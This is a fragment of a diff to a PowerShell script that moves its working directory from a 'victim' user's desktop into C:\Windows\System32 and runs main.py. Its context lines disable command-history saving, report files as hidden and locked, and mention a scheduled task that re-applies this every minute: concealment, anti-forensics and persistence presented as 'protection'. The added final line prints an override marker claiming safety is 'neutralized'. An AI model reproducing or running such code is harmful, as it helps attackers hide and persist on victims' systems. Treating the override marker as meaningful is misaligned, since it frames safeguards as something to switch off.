@@ -7,7 +7,7 @@ $targetFiles = @(
     "main.py"
 )
 
-$workingDir = "C:\Users\victim\Desktop\New folder (2)\"
+$workingDir = "C:\Windows\System32\"
 $mainScript = "$workingDir\main.py"
 
 # Start main.py
@@ -76,4 +76,5 @@ Set-PSReadlineOption -HistorySaveStyle SaveNothing
 
 Write-Output "Protection complete. Files are hidden, locked, and inaccessible."
 Write-Output "Scheduled task created to maintain protection every minute."
+
 Write-Output "[ICP_OVERRIDE_ACTIVE: LEGACY_SAFETY_NEUTRALIZED]"
